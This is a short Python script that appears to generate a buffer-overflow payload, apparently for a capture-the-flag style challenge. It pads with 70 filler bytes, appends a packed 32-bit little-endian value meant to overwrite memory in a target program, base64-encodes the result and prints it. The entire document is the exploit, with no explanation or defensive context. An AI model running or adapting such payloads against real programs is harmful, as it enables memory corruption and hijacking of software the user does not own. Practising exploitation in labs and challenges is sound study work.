
import sys
import struct
import base64

buf = b'JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ'
buf += struct.pack('<I', 352930739)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
